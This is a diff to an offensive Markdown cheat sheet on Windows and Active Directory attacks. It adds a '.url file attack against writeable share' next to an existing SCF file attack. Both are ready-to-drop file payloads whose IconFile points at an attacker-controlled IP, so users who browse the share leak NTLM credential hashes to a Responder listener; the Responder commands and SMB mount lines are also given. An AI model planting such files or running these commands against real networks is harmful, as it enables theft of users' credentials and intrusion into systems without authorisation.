@@ -264,9 +264,9 @@ smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 sudo mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder
 ```
 
-### SCF file attack against writeable share
+### SCF and URL file attack against writeable share
 
-Drop the following `something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
+Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
 
 ```powershell
 [Shell]
@@ -275,6 +275,17 @@ IconFile=\\10.10.XX.XX\Share\test.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
+
+This attack also works with `.url` files and `responder -I eth0 -v`.
+
+```powershell
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\192.168.1.29\%USERNAME%.icon
+IconIndex=1
+```
+
 
 ### GPO - Pivoting with Local Admin & Passwords in SYSVOL
 
